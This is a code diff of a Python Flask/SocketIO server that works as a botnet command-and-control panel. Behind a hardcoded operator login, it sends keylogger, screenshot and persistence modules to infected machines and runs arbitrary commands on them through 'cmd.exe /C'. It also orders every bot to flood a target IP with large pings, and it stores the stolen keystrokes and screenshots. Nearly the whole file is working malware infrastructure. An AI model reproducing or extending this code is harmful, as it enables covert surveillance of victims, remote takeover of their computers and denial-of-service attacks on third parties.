@@ -1,32 +1,27 @@
+#Server.py
+
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify
-from flask_socketio import SocketIO
-import keylogger, persistence, screenshot, subprocess, os, requests
+from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
-socketio = SocketIO(app)
+server = SocketIO(app)
 app.secret_key = 'Fixer'
 
 USERNAME = 'Leopard'
-PASSWORD = 'leopard'
-idNum = 0
+PASSWORD = 'leopard79864506'
+idNumber = 0
 database = []
 completedTasks = []
+command_output = 'COMMAND OUTPUT'
+ping_output_list = []
 screenshotNumber = 0
 keyloggerNumber = 0
-persistenceVariable = False
-
-class TaskDone:
-    def __init__(self, info):
-        self.idNum = info['idNum']
-        self.hostname = info['hostname']
-        self.commandSent = info['commandSent']
-        self.output = info['DATA']
 
 class Client:
     def __init__(self, info):
-        global idNum
-        self.idNum = idNum
-        idNum += 1
+        global idNumber
+        self.idNumber = idNumber
+        idNumber += 1
         self.persistence = False
         self.IP = info['IP']
         self.hostname = info['hostname']
@@ -34,25 +29,18 @@ class Client:
         self.sid = info['sid']
         self.status = "Alive"
 
-    def execute_command(self, command):
-        try:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate()
-            output_str = output.decode('utf-8') if output else ""
-            error_str = error.decode('utf-8') if error else ""
-            if error_str:
-                result = f"Error: {error_str}"
-            else:
-                result = f"Output: {output_str}"
-            return result
-        except Exception as e:
-            return f"Error: {str(e)}"
+class TaskDone:
+    def __init__(self, info):
+        self.idNumber = info['idNumber']
+        self.hostname = info['hostname']
+        self.command = info['command']
+        self.status = info['DATA']
 
 @app.route('/')
 def redirectLogin():
     return redirect(url_for('login'))
 
-@app.route('/login.html', methods=['POST', 'GET'])
+@app.route('/login', methods=['POST', 'GET'])
 def login():
     if request.method == 'POST':
         username = request.form.get('userid')
@@ -65,181 +53,150 @@ def login():
             return render_template('login.html')
     return render_template('login.html')
 
-@app.route('/dashboard.html')
+@app.route('/dashboard')
 def dashboard():
     if session.get('loggedin'):
         return render_template('dashboard.html', database=database)
     return redirect(url_for('login'))
 
-@app.route('/modules.html', methods=['GET', 'POST'])
+@app.route('/modules', methods=['GET', 'POST'])
 def modules():
     if session.get('loggedin'):
+        commandStatus = None
         if request.method == 'POST':
             idNumber = request.form.get('idNumber')
             command = request.form.get('command')
             hostname = None
-            client_info = next((client for client in database if client.idNum == int(idNumber)), None)
 
-            if client_info:
-                hostname = client_info.hostname
+            if idNumber:
+                client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
+                if client_info:
+                    hostname = client_info.hostname
+                else:
+                    return "ERROR: BOT with Provided BOT-ID not Found"
+                send_modules(idNumber, command, hostname)
+                return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
+            else:
+                return "ERROR : Bot ID not provided"
 
-            if command == 'keylogger':
-                keylogger_output = keylogger.start_keylogger()
-                if keylogger_output:
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'KEYLOGGER',
-                        'DATA': "Keylogger start Failed"
-                    }))
-                else:
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'KEYLOGGER',
-                        'DATA': "Keylogger started"
-                    }))
-            elif command == 'persistence':
-                try:
-                    persistence_output = persistence.try_persistence()
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'PERSISTENCE',
-                        'DATA': "Persistence command executed successfully"
-                    }))
-                except Exception as e:
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'PERSISTENCE',
-                        'DATA': f"Error executing persistence command: {str(e)}"
-                    }))
-            elif command == 'screenshot':
-                output_dir = r'./static/receivedData/screenshots/'
-                screenshot_path = screenshot.take_screenshot(output_dir)
-                if isinstance(screenshot_path, str):
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'SCREENSHOT',
-                        'DATA': f"Screenshot taken and saved at: {screenshot_path}"
-                    }))
-                else:
-                    completedTasks.append(TaskDone({
-                        'idNum': idNumber,
-                        'hostname': hostname,
-                        'commandSent': 'SCREENSHOT',
-                        'DATA': f"Error Taking Screenshot: {screenshot_path}"
-                    }))
-        return render_template('modules.html', taskDb=completedTasks)
+        return render_template('modules.html', taskDb=completedTasks, commandStatus=commandStatus)
     return redirect(url_for('login'))
 
-@app.route('/commands.html', methods=['GET', 'POST'])
-@app.route('/commands', methods=['GET', 'POST'])
+def send_modules(idNumber, command, hostname):
+    if command not in ['screenshot', 'persistence', 'keylogger']:
+        return "ERROR : Invalid Modules Command Provided"
+    server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
+
+@server.on('module_output')
+def handle_modules_output(module_output):
+    idNumber = module_output.get('idNumber')
+    command = module_output.get('command')
+    hostname = module_output.get('hostname')
+    status = module_output.get('DATA')
+    completedTasks.append(TaskDone({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': status}))
+
+@app.route('/commands', methods=['GET'])
 def commands():
-    if request.method == 'POST':
-        user_command = request.json.get('command')
-        bot_id = request.json.get('botId')
-        output = execute_command_on_bot(bot_id, user_command)
-        return jsonify(output=output)
-    elif request.method == 'GET':
-        output = request.args.get('output')
-        return render_template('commands.html', output=output)
+    if not session.get('loggedin'):
+        return redirect(url_for('login'))
 
-def execute_command_on_bot(bot_id, command):
-    client = next((c for c in database if c.idNum == int(bot_id)), None)
-    if not client:
-        return f"Error: Bot with ID {bot_id} not found"
-    try:
-        result = client.execute_command(command)
-        return result
-    except Exception as e:
-        return f"Error: {str(e)}"
+    idNumber = request.args.get('idNumber')
+    command = request.args.get('command')
 
-def receive_output():
-    output = request.json.get('output')
-    print("Received output:", output.stdout)
-    return "Output received successfully", 200
-
-def receive_output(output):
-    data = {"output": output}
-    try:
-        response = requests.post("http://192.168.100.222/executecommands", json=data)
-        if response.status_code == 200:
-            print("Output sent successfully.")
+    if idNumber and command:
+        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
+        if client_info:
+            hostname = client_info.hostname
+            send_commands(idNumber, command, hostname)
+            global command_output
+            return render_template('commands.html', commands_output=command_output)
         else:
-            print("Failed to send output. Status code:", response.status_code)
-    except Exception as e:
-        print("Error:", e)
+            return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
+    else:
+        return render_template('commands.html', commands_output="Please Send a Command First")
 
-@app.route('/ping.html', methods=['GET', 'POST'])
+def send_commands(idNumber, command, hostname):
+    client = next((c for c in database if c.idNumber == int(idNumber)), None)
+    if not client:
+        return f"ERROR : Bot with BOT-ID {idNumber} not found"
+    else:
+        command = f"cmd.exe /C {command}"
+        server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
+
+@server.on('commands_output')
+def handle_commands_output(commands_output):
+    global command_output
+    command_output = commands_output.get('output')
+
+@app.route('/ping', methods=['GET'])
 def ping():
-    if request.method == 'POST':
-        ip_address = request.form.get('target_ip')
-        output = run_ping(ip_address)
-        return render_template('ping.html', output=output)
+    ip_address = request.args.get('target_ip')
+    if ip_address:
+        send_ping(ip_address)
+        global ping_output_list
+        return render_template('ping.html', output=ping_output_list)
     return render_template('ping.html')
 
-def run_ping(ip_address):
-    try:
+def send_ping(ip_address):
+    for client in database:
+        idNumber = client.idNumber
         command = f'ping {ip_address} -t -l 65500'
-        output = {}
-        for client in database:
-            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output[client.idNum] = {
-                'hostname': client.hostname,
-                'status': 'Ping command sent successfully'
-            }
-        return output
-    except Exception as e:
-        return f"Error sending DDoS Ping command to all bots: {str(e)}"
+        server.emit('ping', {'idNumber': idNumber, 'ip_address' : ip_address, 'command': command})
+
+@server.on('ping_output')
+def handle_ping_output(ping_output):
+    idNumber = ping_output.get('idNumber')
+    output = ping_output.get('output')
+    client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
+    if client_info:
+        hostname = client_info.hostname
+        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'output': output})
 
 @app.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for('login'))
 
-@socketio.on('connect')
+@server.on('connect')
 def onConnect():
     pass
 
-@socketio.on('message')
+@server.on('Initial_Information')
+def handleInformation(Initial_Information):
+        database.append(Client(Initial_Information))
+
+@server.on('message')
 def handleMessage(message):
     command = message.get('COMMAND')
-    if command == 'INFO':
-        database.append(Client(message))
-    elif command == 'OUTPUT':
-        if 'persistence' in message['commandSent']:
+    if command == 'OUTPUT':
+        if 'persistence' in message['command']:
             if message['PV']:
                 for x in database:
-                    if x.idNum == message['idNum']:
+                    if x.idNumber == message['idNumber']:
                         x.persistence = True
 
-            if "screenshot" in message['commandSent']:
+            if "screenshot" in message['command']:
                 global screenshotNumber
-                with open(f'./static/receivedData/screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
+                with open(f'./Data/Screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
                     f.write(message['DATA'])
-                    tmp = f'/static/receivedData/screenshots/screenshot_{screenshotNumber}.png'
+                    tmp = f'/Data/Screenshots/screenshot_{screenshotNumber}.png'
                     message['DATA'] = tmp
                     screenshotNumber += 1
 
-            if 'keylogger' in message['commandSent']:
+            if 'keylogger' in message['command']:
                 global keyloggerNumber
-                with open(f'./static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
+                with open(f'./Data/Keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
                     f.write(message['DATA'])
-                    tmp = f'/static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt'
+                    tmp = f'/Data/Keylogs/keylogs_{keyloggerNumber}.txt'
                     message['DATA'] = tmp
                     keyloggerNumber += 1
+            else:
+                message['DATA'] = message['DATA'].decode("utf-8")
 
-            completedTasks.append(TaskDone(message))
-    elif command == 'status update':
-        for c in database:
-            if c.idNum == message['idNum']:
-                c.status = "Dead"
+            for x in database:
+                if x.idNumber == message['idNumber']:
+                    x.tasks.append(message)
+    emit('message', message, broadcast=True)
 
 if __name__ == '__main__':
-    app.config['UPLOAD_FOLDER'] = 'output_files'
-    if not os.path.exists(app.config['UPLOAD_FOLDER']):
-        os.makedirs(app.config['UPLOAD_FOLDER'])
-    socketio.run(app, host='0.0.0.0')
+    server.run(app, host='0.0.0.0', port=5000)
